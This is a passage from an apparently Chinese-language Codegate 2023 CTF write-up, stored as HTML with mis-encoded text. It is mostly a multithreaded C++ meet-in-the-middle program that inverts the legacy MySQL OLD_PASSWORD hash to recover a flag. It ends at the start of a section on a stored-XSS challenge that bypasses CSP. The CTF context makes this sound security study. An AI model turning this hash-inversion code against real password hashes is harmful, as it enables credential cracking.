&quot;codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP&quot;])</code></li>\n<li>ç»“å°¾çš„11ä¸ªå­—ç¬¦<code>i_love_you&#125;</code>å¯¹åº”addå€¼ï¼š1207</li>\n<li>æœªçŸ¥ï¼šæ•´ä¸ªflagå­—ç¬¦ä¸²çš„addå€¼<ul>\n<li>ä½†addå€¼çš„å¯èƒ½èŒƒå›´å¾ˆæœ‰é™ï¼Œæˆ‘ä»¬å¯ä»¥å®¹æ˜“è®¡ç®—å‡ºä¸Šä¸‹ç•Œï¼šä¸‹ç•Œä¸º3430+39*32&#x3D;4678ï¼Œä¸Šç•Œä¸º3430+40*127&#x3D;8510</li>\n<li><strong>å¹¶ä¸”ï¼Œè¿™ä¸ªèŒƒå›´å†…åˆæ³•çš„addå€¼å æ¯”å¹¶ä¸é«˜ï¼šå¯¹äºä¸€ä¸ªå¯èƒ½çš„addå€¼ï¼Œå¾€å›æ¨ç»“å°¾çš„é‚£11ä¸ªå­—ç¬¦<code>i_love_you&#125;</code>å¿…é¡»éƒ½æœ‰è§£</strong></li>\n</ul>\n</li>\n</ul>\n<p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦MitMï¼Œä¸­é—´ç›¸é‡ï¼Œå³å¯çˆ†å‡ºæ­£è§£ã€‚<br>è¿™ä¸ªä¸­é—´çŠ¶æ€æŒ‡çš„æ˜¯<code>&lt;???&gt;</code>è¿™ä¸²æœªçŸ¥å­—ä¸²ä¸­é—´æŸä¸ªä½ç½®ä¸€ä¸ªç‹¬ç‰¹çš„nr&#x2F;nr2&#x2F;addå¯¹ï¼›è€Œè¿™ä¸ªaddå€¼æ¯•ç«Ÿåªæ˜¯ä¸€ä¸ªä¸­é—´é‡ï¼ˆ<strong>ä¸‹ç§°fadd</strong>ï¼‰ï¼Œå¯ä»¥æ‰‹åŠ¨ç»™äºˆä¸€ä¸ªå€¼ã€‚åœ¨æœ¬é¢˜ä¸­æˆ‘ä»¬æ‰‹åŠ¨è¦æ±‚ä»<code>codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP&lt;???&gt;i_love_you&#125;</code>å†å‘å‰å¡«å……æ€»è®¡<code>6*127</code>çš„å­—ç¬¦ä½œä¸ºä¸­é—´ç›¸é‡å¤„ï¼šå½“ç„¶è¶Šå¤§çš„å€¼æœç´¢ç©ºé—´è¶Šå¤§ã€‚  </p>\n<ol>\n<li>æˆ‘ä»¬å…ˆç­›é€‰å‡ºå¯è¡Œçš„addå€¼ï¼Œå¹¶è®°å½•åœ¨å¤„ç†<code>i_love_you&#125;</code>å‰çš„ä¸­é—´addå€¼</li>\n<li>é€†å‘: å¯¹äºæ¯ä¸ªä¸­é—´addå€¼å…ˆé€†æ¨5æ­¥ï¼Œè®°å½•æ‰€æœ‰å¯èƒ½åœ¨ä¸­é—´ç›¸é‡å¤„addå€¼ä¸ºfaddçš„nr&#x2F;nr2å¯¹ï¼Œä»¥åŠé€†å‘å¯¹åº”çš„5ä¸ªå­—ç¬¦</li>\n<li>æ­£å‘: æˆ‘ä»¬æ‰‹åŠ¨è¦æ±‚å‘å‰æ•°æ­¥ï¼ˆè‡³å°‘6æ­¥ï¼Œå› ä¸ºfaddå€¼æ˜¯3430+6*127ï¼‰åˆ°è¾¾ä¸­é—´ç›¸é‡å¤„ä½¿å¾—addå€¼ä¸ºfaddï¼Œå¹¶æ£€æŸ¥è¿™ä¸ªnr&#x2F;nr2å¯¹æ˜¯å¦å‡ºç°åœ¨é€†å‘å¾—åˆ°çš„ç»“æœä¸­ï¼›å¦‚æœæœ‰ï¼Œåˆ™æ‹¿ä¸‹ã€‚<br>çˆ†ç ´ä»£ç ï¼šCredit to @4qwerty<br>ä¸ºä»€ä¹ˆforåµŒå¥—è¿™ä¹ˆå¤šï¼Ÿå› ä¸º4è€å¸ˆæ‡’å¾—å†™é€’å½’ï¼Œåæ­£æ²¡å‡ æ­¥ï¼Œä¸å¤Ÿå°±åŠ ä¸€å±‚forå°±è¡Œäº†ã€‚<br>å…¶å®å¦‚æœè¦è®¡ç®—çš„è¯æ˜¯å¯ä»¥çš„ï¼šé€†ç€5æ­¥å¤§çº¦æœ‰<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stddef.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;thread&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;mutex&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unordered_map&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;atomic&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">int</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">oldpw_rev</span><span class=\"params\">(<span class=\"type\">uint32_t</span> *pnr, <span class=\"type\">uint32_t</span> *pnr2, <span class=\"type\">uint32_t</span> add,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *cc, <span class=\"type\">unsigned</span> len)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nr, nr2;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> c, u, e, y;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (len == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    nr = *pnr;</span><br><span class=\"line\">    nr2 = *pnr2;</span><br><span class=\"line\">    c = cc[len - <span class=\"number\">1</span>];</span><br><span class=\"line\">    add -= c;</span><br><span class=\"line\"></span><br><span class=\"line\">    u = nr2 - nr;</span><br><span class=\"line\">    u = nr2 - ((u &lt;&lt; <span class=\"number\">8</span>) ^ nr);</span><br><span class=\"line\">    u = nr2 - ((u &lt;&lt; <span class=\"number\">8</span>) ^ nr);</span><br><span class=\"line\">    nr2 = nr2 - ((u &lt;&lt; <span class=\"number\">8</span>) ^ nr);</span><br><span class=\"line\">    nr2 &amp;= <span class=\"number\">0x7FFFFFFF</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    y = nr;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (e = <span class=\"number\">0</span>; e &lt; <span class=\"number\">64</span>; e ++) &#123;</span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> z, g;</span><br><span class=\"line\"></span><br><span class=\"line\">        z = (e + add) * c;</span><br><span class=\"line\">        g = (e ^ z) &amp; <span class=\"number\">0x3F</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (g == (y &amp; <span class=\"number\">0x3F</span>)) &#123;</span><br><span class=\"line\">            <span class=\"type\">uint32_t</span> x;</span><br><span class=\"line\"></span><br><span class=\"line\">            x = e;</span><br><span class=\"line\">            x = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            x = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\">            x = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\">            nr = y ^ (z + (x &lt;&lt; <span class=\"number\">8</span>));</span><br><span class=\"line\">            nr &amp;= <span class=\"number\">0x7FFFFFFF</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"built_in\">oldpw_rev</span>(&amp;nr, &amp;nr2, add, cc, len - <span class=\"number\">1</span>) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                *pnr = nr;</span><br><span class=\"line\">                *pnr2 = nr2;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">forward</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *cc, <span class=\"type\">unsigned</span> len, <span class=\"type\">uint32_t</span> *nr, <span class=\"type\">uint32_t</span> *nr2, <span class=\"type\">uint32_t</span> *add)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> tmp;</span><br><span class=\"line\">    <span class=\"type\">int</span> i;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; len; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cc[i] == <span class=\"string\">&#x27; &#x27;</span> || cc[i] == <span class=\"string\">&#x27;\\t&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        tmp = cc[i];</span><br><span class=\"line\">        *nr ^= (((*nr &amp; <span class=\"number\">63</span>) + *add) * tmp) + (*nr &lt;&lt; <span class=\"number\">8</span>);</span><br><span class=\"line\">        *nr2 += (*nr2 &lt;&lt; <span class=\"number\">8</span> ) ^ *nr;</span><br><span class=\"line\">        *add += tmp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> mask = (((<span class=\"type\">uint32_t</span>)<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">31</span>) - (<span class=\"type\">uint32_t</span>)<span class=\"number\">1</span>); <span class=\"comment\">// 111....11, 31bits</span></span><br><span class=\"line\">    *nr &amp;= mask;</span><br><span class=\"line\">    *nr2 &amp;= mask;</span><br><span class=\"line\">    <span class=\"comment\">// printf(&quot;hash: %x %x\\n&quot;, *nr, *nr2);</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">calc</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *cc, <span class=\"type\">unsigned</span> len, <span class=\"type\">uint32_t</span> *nr, <span class=\"type\">uint32_t</span> *nr2)</span> </span>&#123;</span><br><span class=\"line\">\t*nr = <span class=\"number\">1345345333</span>;</span><br><span class=\"line\">\t*nr2 = <span class=\"number\">0x12345671</span>;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> add = <span class=\"number\">7</span>;</span><br><span class=\"line\">    forward(cc, len, nr, nr2, &amp;add);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">Ans</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> buf[<span class=\"number\">6</span>];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">pair_hash</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">template</span> &lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T1</span>, <span class=\"keyword\">class</span> <span class=\"title class_\">T2</span>&gt;</span><br><span class=\"line\">    <span class=\"function\">std::<span class=\"type\">size_t</span> <span class=\"title\">operator</span><span class=\"params\">()</span> <span class=\"params\">(<span class=\"type\">const</span> std::pair&lt;T1, T2&gt; &amp;pair)</span> <span class=\"type\">const</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::<span class=\"built_in\">hash</span>&lt;T1&gt;()(pair.first) ^ std::<span class=\"built_in\">hash</span>&lt;T2&gt;()(pair.second);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">bool</span> ok_maps[<span class=\"number\">65536</span>] = &#123;<span class=\"number\">0</span>&#125;; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nr, nr2;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> cp[] = <span class=\"string\">&quot;codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP_bEEE_KE03&quot;</span>;</span><br><span class=\"line\">    nr = <span class=\"number\">1345345333</span>;</span><br><span class=\"line\">\tnr2 = <span class=\"number\">0x12345671</span>;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> add = <span class=\"number\">7</span>;</span><br><span class=\"line\">    forward(cp, <span class=\"built_in\">strlen</span>((<span class=\"type\">char</span> *)cp), &amp;nr, &amp;nr2, &amp;add);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;nr: %x, nr2: %x, add: %x\\n&quot;</span>, nr, nr2, add);</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> fnr = nr, fnr2 = nr2, fadd = add;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> uadd = <span class=\"number\">127</span> * <span class=\"number\">6</span>, fuadd = fadd;</span><br><span class=\"line\">    fadd += uadd;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">char</span> cs[] = <span class=\"string\">&quot;i_love_you&#125;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    std::vector&lt;std::thread&gt; ths;</span><br><span class=\"line\">    std::mutex mtx;</span><br><span class=\"line\">    std::unordered_map&lt;std::pair&lt;<span class=\"type\">uint32_t</span>, <span class=\"type\">uint32_t</span>&gt;, Ans, pair_hash&gt; maps;</span><br><span class=\"line\">    std::atomic&lt;<span class=\"type\">int</span>&gt; cnter&#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">500</span>; i &lt; <span class=\"number\">20000</span>; i++) &#123; <span class=\"comment\">// find possible `add` value </span></span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> pnr = <span class=\"number\">0x63686163</span>, pnr2 = <span class=\"number\">0x68613230</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> ans = <span class=\"built_in\">oldpw_rev</span>(&amp;pnr, &amp;pnr2, i, cs, <span class=\"number\">11</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ans != <span class=\"number\">0</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        ok_maps[i] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = <span class=\"number\">33</span>; i &lt; <span class=\"number\">127</span>; i++) &#123; </span><br><span class=\"line\">        ths.<span class=\"built_in\">emplace_back</span>([&amp;, i] &#123;</span><br><span class=\"line\">            std::vector&lt;std::pair&lt;std::pair&lt;<span class=\"type\">uint32_t</span>, <span class=\"type\">uint32_t</span>&gt;, Ans&gt;&gt; all;</span><br><span class=\"line\">            Ans cc;</span><br><span class=\"line\">            cc.buf[<span class=\"number\">5</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            cc.buf[<span class=\"number\">4</span>] = i;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> c = <span class=\"number\">33</span>; c &lt; <span class=\"number\">127</span>; c++) &#123;</span><br><span class=\"line\">                cc.buf[<span class=\"number\">3</span>] = c;</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> d = <span class=\"number\">33</span>; d &lt; <span class=\"number\">127</span>; d++) &#123;</span><br><span class=\"line\">                    cc.buf[<span class=\"number\">2</span>] = d;</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> a = <span class=\"number\">33</span>; a &lt; <span class=\"number\">127</span>; a++) &#123;</span><br><span class=\"line\">                        <span class=\"type\">int</span> sumer = fadd + i + c + d + a + <span class=\"number\">1207</span>;</span><br><span class=\"line\">                        cc.buf[<span class=\"number\">1</span>] = a;</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> b = <span class=\"number\">33</span>; b &lt; <span class=\"number\">127</span>; b++) <span class=\"keyword\">if</span> (ok_maps[sumer + b]) &#123;</span><br><span class=\"line\">                            cc.buf[<span class=\"number\">0</span>] = b;</span><br><span class=\"line\">                            <span class=\"type\">uint32_t</span> pnr = <span class=\"number\">0x63686163</span>, pnr2 = <span class=\"number\">0x68613230</span>;</span><br><span class=\"line\">                            <span class=\"type\">int</span> ans = <span class=\"built_in\">oldpw_rev</span>(&amp;pnr, &amp;pnr2, fadd + i + c + d + a + b + <span class=\"number\">1207</span>, cs, <span class=\"number\">11</span>); <span class=\"comment\">// backward: suffix</span></span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (ans != <span class=\"number\">0</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                            ans = <span class=\"built_in\">oldpw_rev</span>(&amp;pnr, &amp;pnr2, fadd + i + c + d + a + b, cc.buf, <span class=\"number\">5</span>); <span class=\"comment\">// ... and extra 5 steps</span></span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (ans != <span class=\"number\">0</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                            ++cnter; </span><br><span class=\"line\">                            all.<span class=\"built_in\">emplace_back</span>(std::<span class=\"built_in\">make_pair</span>(std::<span class=\"built_in\">make_pair</span>(pnr, pnr2), cc)); <span class=\"comment\">// possible nr/nr2 pair, record it</span></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            std::lock_guard&lt;std::mutex&gt; <span class=\"built_in\">lock</span>(mtx);</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> &amp;&amp;p:all) &#123;</span><br><span class=\"line\">                maps[p.first] = p.second;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> &amp;&amp;th:ths) th.<span class=\"built_in\">join</span>();</span><br><span class=\"line\">    ths.<span class=\"built_in\">clear</span>();</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;MITM&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, cnter.<span class=\"built_in\">load</span>());</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = <span class=\"number\">33</span>; i &lt; <span class=\"number\">127</span>; i++) &#123; <span class=\"comment\">// forward</span></span><br><span class=\"line\">        ths.<span class=\"built_in\">emplace_back</span>([&amp;, i] &#123;</span><br><span class=\"line\">            <span class=\"type\">unsigned</span> <span class=\"type\">char</span> buf[<span class=\"number\">50</span>];</span><br><span class=\"line\">            buf[<span class=\"number\">0</span>] = i;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> c = <span class=\"number\">33</span>; c &lt; <span class=\"number\">127</span>; c++) &#123;</span><br><span class=\"line\">                buf[<span class=\"number\">1</span>] = c;</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> d = <span class=\"number\">33</span>; d &lt; <span class=\"number\">127</span>; d++) &#123;</span><br><span class=\"line\">                    buf[<span class=\"number\">2</span>] = d;</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> a = <span class=\"number\">33</span>; a &lt; <span class=\"number\">127</span>; a++) &#123;</span><br><span class=\"line\">                        buf[<span class=\"number\">3</span>] = a;</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> b = <span class=\"number\">33</span>; b &lt; <span class=\"number\">127</span>; b++) &#123;</span><br><span class=\"line\">                            buf[<span class=\"number\">4</span>] = b;</span><br><span class=\"line\">                            <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> e = <span class=\"number\">33</span>; e &lt; <span class=\"number\">127</span>; e++) &#123;</span><br><span class=\"line\">                                buf[<span class=\"number\">5</span>] = e;</span><br><span class=\"line\">                                <span class=\"type\">int</span> re = uadd - i - c - d - a - b - e;</span><br><span class=\"line\">                                <span class=\"type\">int</span> iter = <span class=\"number\">6</span>;</span><br><span class=\"line\">                                <span class=\"keyword\">while</span> (re &gt;= <span class=\"number\">33</span>) &#123; <span class=\"comment\">// padding, to make the `add` value is `fadd`</span></span><br><span class=\"line\">                                    <span class=\"type\">int</span> tw = re;</span><br><span class=\"line\">                                    <span class=\"keyword\">if</span> (re &gt; <span class=\"number\">126</span>) &#123;</span><br><span class=\"line\">                                        tw = <span class=\"string\">&#x27;a&#x27;</span>;</span><br><span class=\"line\">                                    &#125;</span><br><span class=\"line\">                                    buf[iter++] = tw;</span><br><span class=\"line\">                                    re -= tw;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (re != <span class=\"number\">0</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                                buf[iter] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                                <span class=\"type\">uint32_t</span> nr = fnr, nr2 = fnr2, add = fuadd;</span><br><span class=\"line\">                                forward(buf, iter, &amp;nr, &amp;nr2, &amp;add);</span><br><span class=\"line\">                                <span class=\"keyword\">auto</span> cc2 = std::<span class=\"built_in\">make_pair</span>(nr, nr2);</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (maps.<span class=\"built_in\">find</span>(cc2) != maps.<span class=\"built_in\">end</span>()) &#123; <span class=\"comment\">// GOT!!!</span></span><br><span class=\"line\">                                    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s%s%s%s\\n&quot;</span>, cp, buf, maps[cc2].buf, cs);</span><br><span class=\"line\">                                    <span class=\"comment\">// exit(0);</span></span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> &amp;&amp;th:ths) th.<span class=\"built_in\">join</span>();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"Chaâ€™s-Diary\"><a href=\"#Chaâ€™s-Diary\" class=\"headerlink\" title=\"Chaâ€™s Diary\"></a>Chaâ€™s Diary</h2><p>éé¢„æœŸäº†ã€‚<br>å‚¨å­˜å‹XSSï¼Œå…è®¸è·¨åŸŸã€‚<br>æœ‰CSPç­–ç•¥ä¿æŠ¤ï¼Œiframeè¢«ç¦æ­¢åŠ 